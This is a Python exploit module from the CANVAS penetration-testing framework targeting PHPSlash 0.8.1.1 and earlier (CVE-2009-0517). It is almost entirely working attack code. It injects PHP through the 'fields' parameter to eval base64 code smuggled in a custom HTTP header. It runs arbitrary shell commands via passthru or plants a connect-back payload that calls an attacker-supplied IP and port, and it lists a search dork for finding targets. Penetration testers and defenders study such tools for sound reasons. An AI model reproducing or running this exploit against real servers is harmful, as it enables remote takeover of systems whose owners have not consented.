#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2008
# http://www.immunityinc.com/CANVAS/ for more information
#

import sys
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.php_multi import *
import libs.spkproxy as spkproxy
import canvasengine

NAME="PHPSlash <= 0.8.1.1 Remote Code Execution"
DESCRIPTION="PHPSlash <= 0.8.1.1 Remote Code Execution"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="http://sourceforge.net/projects/phpslash/"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"]="CVE-2009-0517"
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=2009-0517"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["References"]=["http://osvdb.org/show/osvdb/51727"]
DOCUMENTATION["DORK"]=["PHPSlash"]

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux" ] , ["Windows"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""

"""

CHANGELOG="""
"""

class theexploit(php_multi):
    def __init__(self):
        php_multi.__init__(self)
        self.port=80
        self.host=""
        self.ssl=""
        self.name=NAME
        self.basepath="/"
        self.basepaths=["/phpslash-0.8.1.1/public_html/","/phpslash/","/slash/","/"]
        self.command=None 
        self.basicauth_user=""
        self.basicauth_password=""
        self.user=""
        self.password=""
        self.hostname=None
        self.foundstrings=["PHPSlash"]
        self.testfile="index.php"       
        return 

    def request1(self):

        if self.command:
            self.log("[+] Command: %s"%self.command)

            command=self.command
            command=b64encode("passthru('"+command+"');")

            code = "1');print(startz);eval(base64_decode($_SERVER[HTTP_CODE]));exit();//"
            code = self.mysql_conv(code)

            #bypassing some magic_quotes_gpc 
            data = self.UA.addHeader("CODE",command)
            data = self.UA.GET("index.php?fields=%s,1"%code)

            if "startz" in data:
                result=data.split("startz")[1].split("endz")[0]
                self.log("Command result=%s"%prettyprint(result))
                ret=1
            else:
                self.log("[-] Command not run - service patched?!")
        else:
            command=self.get_php_to_mosdef()
            command=b64encode(command)

            code = "1');eval(base64_decode($_SERVER[HTTP_CODE]));exit();//"
            code = self.mysql_conv(code)

            data = self.UA.addHeader("CODE",command)
            data = self.UA.GET("index.php?fields=%s,1"%code)

            ret=self.ISucceeded()

        return ret

    def usage(self):
        print "Example: "+sys.argv[0]+" -t 172.16.104.128 -p 80 -O user:temp -O password:password -l 10.10.10.227 -d 9898"
        print "-t <target ip>"
        print "-p <target port>                [optional]"
        print "-O basepath: /path/to/phpslash/      [optional]"
        print "-O hostname: target vhost       [optional]"
        print "-O command:commandtorun         [optional]"
        print "-O user: forum username"
        print "-O password: forum password"
        print "-l call back ip if doing connect back"
        print "-d listening port for call back"
        return

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
